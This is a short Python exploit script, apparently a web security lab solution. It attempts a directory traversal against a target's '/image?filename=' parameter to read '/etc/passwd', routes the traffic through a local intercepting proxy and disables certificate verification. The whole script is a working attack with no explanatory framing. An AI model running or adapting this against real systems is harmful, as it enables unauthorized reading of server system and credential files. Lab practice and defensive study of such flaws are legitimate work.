import sys
import urllib3
import requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies={'http' : 'http://127.0.0.1:8080','https' : 'http://127.0.0.1:8080'}
def director_traversal(url):
    image=url + '/image?filename=../../../etc/passwd'
    r=requests.get(image,verify=False,proxies=proxies)
    if 'root:x' in r.text:
        print(r.text)
    else:
        print('failed')
        sys.exit(-1)
          
def main():
    if len(sys.argv)!=2:
        print("wrong")
        sys.exit(-1)
    url=sys.argv[1] 
    director_traversal(url)   
if __name__ == "__main__" :
    main()  